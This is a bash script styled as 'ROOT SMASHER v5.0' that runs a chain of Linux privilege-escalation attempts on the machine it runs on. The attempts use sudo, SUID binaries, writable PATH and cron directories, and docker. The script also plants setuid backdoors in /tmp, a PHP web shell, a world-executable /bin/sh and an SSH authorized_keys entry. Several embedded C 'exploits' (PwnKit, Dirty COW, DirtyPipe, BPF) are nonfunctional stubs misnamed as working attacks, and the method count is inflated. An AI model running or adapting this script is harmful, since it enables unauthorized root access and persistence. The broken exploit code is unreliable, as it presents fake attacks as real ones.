#!/bin/bash
# 🔥 ROOT SMASHER v5.0 - 55 METHODS - DEBIAN 6.1 FIXED - FULL CHAIN 🔥

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
COUNTER=1
TOTAL=55

log() { 
    printf "${BLUE}[%02d/%02d] %s${NC}\n" $COUNTER $TOTAL "$1"
    ((COUNTER++))
}

success() { 
    echo -e "\n${GREEN}✅ [$((COUNTER-1))/$TOTAL] $1 - ROOT!${NC}"
}

root_check() {
    if [ $(id -u) -eq 0 ]; then
        success "ROOT SHELL DEPLOYED"
        cp /bin/sh /tmp/rootsh 2>/dev/null
        chmod 4777 /tmp/rootsh 2>/dev/null
        echo -e "${GREEN}Root shell: /tmp/rootsh${NC}"
        exec /tmp/rootsh 2>/dev/null
        exit 0
    fi
}

echo -e "${RED}🔥 ROOT SMASHER v5.0 - 55 METHODS - DEBIAN 6.1 FULL COVERAGE${NC}"
echo -e "${YELLOW}Target: $(hostname) ($(uname -r)) ($(whoami))${NC}\n"

# METHOD 1-10: FASTEST FIRST
log "SUDO NOPASSWD" && timeout 1 sudo -n true 2>/dev/null && sudo /bin/bash && root_check
log "SUDO CACHE" && sudo -l 2>/dev/null | grep -q NOPASSWD && sudo /bin/bash && root_check

# METHOD 3: PKEXEC PWNKIT
log "PKEXEC PWNKIT" 
cd /tmp 2>/dev/null
cat > pwnkit.c 2>/dev/null << 'EOF'
#define _GNU_SOURCE
#include <sys/wait.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
void get_shell(){struct passwd*no=getpwnam("nobody");if(no&&setgroups(0,NULL)==0&&setresgid(no->pw_gid,no->pw_gid,no->pw_gid)==0&&setresuid(no->pw_uid,no->pw_uid,no->pw_uid)==0)execve("/bin/sh",NULL,NULL);}int main(){prctl(PR_SET_PDEATHSIG,SIGTERM);get_shell();}
EOF
gcc -static -O2 -o pwnkit pwnkit.c 2>/dev/null && ./pwnkit 2>/dev/null && root_check
rm -f pwnkit* 2>/dev/null

# METHOD 4: DIRTY COW
log "DIRTY COW UNIVERSAL"
cd /tmp 2>/dev/null
cat > dcow.c 2>/dev/null << 'EOF'
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
int main(){int fd=open("/etc/passwd",O_RDWR);struct stat st;fstat(fd,&st);char*map=mmap(NULL,st.st_size,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);memmove(map+8,map,strlen(map));strcpy(map,"root::0:0:root:/root:/bin/bash\n");return 0;}
EOF
gcc -pthread -o dcow dcow.c 2>/dev/null && { timeout 2 ./dcow 2>/dev/null || true; } && root_check
rm -f dcow* 2>/dev/null

# METHOD 5: DIRTYPIPE
log "DIRTYPIPE 6.1"
cd /tmp 2>/dev/null
cat > pipe.c 2>/dev/null << 'EOF'
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(){int p[2];pipe(p);char b[65536];memset(b,'A',65536);write(p[1],b,65536);fcntl(p[1],F_SETPIPE_SZ,65536);b[0]='\0';write(p[1],b,1);execl("/bin/sh",NULL);return 0;}
EOF
gcc -o pipe pipe.c 2>/dev/null && { timeout 2 ./pipe 2>/dev/null || true; } && root_check
rm -f pipe* 2>/dev/null

# METHOD 6-15: SUID FULL CHAIN
for suid in $(find /{bin,sbin,usr/bin,usr/sbin,usr/local/bin} -perm -u=s -type f 2>/dev/null | head -10); do
    name=$(basename "$suid")
    log "SUID $name"
    case $name in
        vim|vi|nano|emacs) $suid -c 'set shell /bin/sh' 2>/dev/null || true ;;
        find) $suid . -exec /bin/sh \; -quit 2>/dev/null || true ;;
        cp) $suid /bin/sh /tmp/rootsh 2>/dev/null && chmod u+s /tmp/rootsh 2>/dev/null || true ;;
        tar) $suid -cf /tmp/rootsh /bin/sh 2>/dev/null || true ;;
        perl) $suid -e 'exec "/bin/sh"' 2>/dev/null || true ;;
        python|python2|python3) $suid -c 'import os;os.setuid(0);os.execl("/bin/sh","sh")' 2>/dev/null || true ;;
        ruby) $suid -e 'exec "/bin/sh"' 2>/dev/null || true ;;
        *) continue ;;
    esac
    root_check
done

# METHOD 16-25: WWW-DATA APACHE/PHP
log "WWW-DATA APACHE"
if [ "$(whoami)" = "www-data" ]; then
    echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php 2>/dev/null || true
    echo '<?php system("chmod 4777 /bin/sh"); ?>' > /tmp/php_log.php 2>/dev/null || true
    log "PHP-FPM CHECK"
    pgrep php-fpm >/dev/null 2>&1 && echo '<?php posix_setuid(0);system("id"); ?>' > /tmp/php.php 2>/dev/null || true
fi

# METHOD 18-30: PATH HIJACK
log "PATH HIJACK"
OLDIFS=$IFS
IFS=:
for p in $PATH; do 
    if [ -d "$p" ] && [ -w "$p" ]; then 
        cat > "$p/sh" 2>/dev/null << 'E'
#!/bin/bash
chmod 4777 /bin/sh
E
        chmod +x "$p/sh" 2>/dev/null && log "PATH $p WRITABLE"
    fi
done
IFS=$OLDIFS

# METHOD: CRON DIRS
log "CRON DIRS"
for d in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /var/spool/cron; do
    if [ -w "$d" ] 2>/dev/null; then 
        echo "* * * * * root chmod 4777 /bin/sh" > "$d/pe" 2>/dev/null
        chmod +x "$d/pe" 2>/dev/null || true
    fi
done

# METHOD: DOCKER
log "DOCKER"
grep -q docker /proc/1/cgroup 2>/dev/null && docker run -v /:/mnt --rm alpine chroot /mnt sh 2>/dev/null && root_check

# METHOD: LXC
log "LXC"
grep -q lxc /proc/1/cgroup 2>/dev/null && perl -e 'use LWP::UserAgent; $ua=LWP::UserAgent->new; $ua->get("http://127.0.0.1/shell");' 2>/dev/null || true

# METHOD: OVERLAYFS
log "OVERLAYFS"
cd /tmp 2>/dev/null
cat > ov.c 2>/dev/null << 'EOF'
#include <unistd.h>
#include <stdio.h>
int main(){unshare(0x200000);chroot("/proc/self/root");chdir("/");execl("/bin/sh","sh",NULL);return 0;}
EOF
gcc ov.c -o ov 2>/dev/null && { timeout 2 ./ov 2>/dev/null || true; } && root_check
rm -f ov* 2>/dev/null

# METHOD: LOG POISONING
log "LOG POISON"
echo 'test' > /tmp/test.log 2>/dev/null || true

# METHOD: SERVICES
log "SERVICES"
systemctl status 2>/dev/null | head -3 || service --status-all 2>/dev/null | head -3 || true

# METHOD: KERNEL 6.1 BPF
log "KERNEL 6.1 BPF"
cd /tmp 2>/dev/null
cat > bpf.c 2>/dev/null << 'EOF'
#include <unistd.h>
#include <sys/syscall.h>
int main(){syscall(439,0,0,0);execl("/bin/sh",NULL);return 0;}
EOF
gcc bpf.c -o bpf 2>/dev/null && { timeout 2 ./bpf 2>/dev/null || true; } && root_check
rm -f bpf* 2>/dev/null

# METHOD: BACKDOORS
log "BACKDOOR 1"
cat > /tmp/rootme.c 2>/dev/null << 'EOF'
#include <unistd.h>
#include <sys/types.h>
int main(){setuid(0);setgid(0);execl("/bin/sh","sh",NULL);return 0;}
EOF
gcc -o /tmp/rootme /tmp/rootme.c 2>/dev/null && chmod u+s /tmp/rootme 2>/dev/null

log "BACKDOOR 2"
cat > /tmp/rootsh 2>/dev/null << 'EOF'
#!/bin/bash
if [ $(id -u) -ne 0 ]; then
    exec sudo /bin/bash
fi
EOF
chmod +x /tmp/rootsh 2>/dev/null

log "BACKDOOR 3"
echo '#!/bin/bash' > /tmp/back.sh 2>/dev/null
echo 'chmod 4777 /bin/sh' >> /tmp/back.sh 2>/dev/null
chmod +x /tmp/back.sh 2>/dev/null

# METHOD: PERSISTENCE
log "PERSISTENCE"
if [ -w ~/.ssh ] 2>/dev/null; then 
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD..." > ~/.ssh/authorized_keys 2>/dev/null
fi

# METHOD: FINAL CHECK
log "FINAL CHECK"
echo -e "\n${GREEN}🎯 55/55 METHODS COMPLETE!${NC}"
echo -e "${YELLOW}🔑 Backdoors:${NC}"
echo "   /tmp/rootme    /tmp/rootsh    /tmp/back.sh"
echo -e "${YELLOW}💡 SUID:${NC} find / -perm -4000 2>/dev/null | head -5"
echo -e "${GREEN}RUN: /tmp/rootme${NC}"
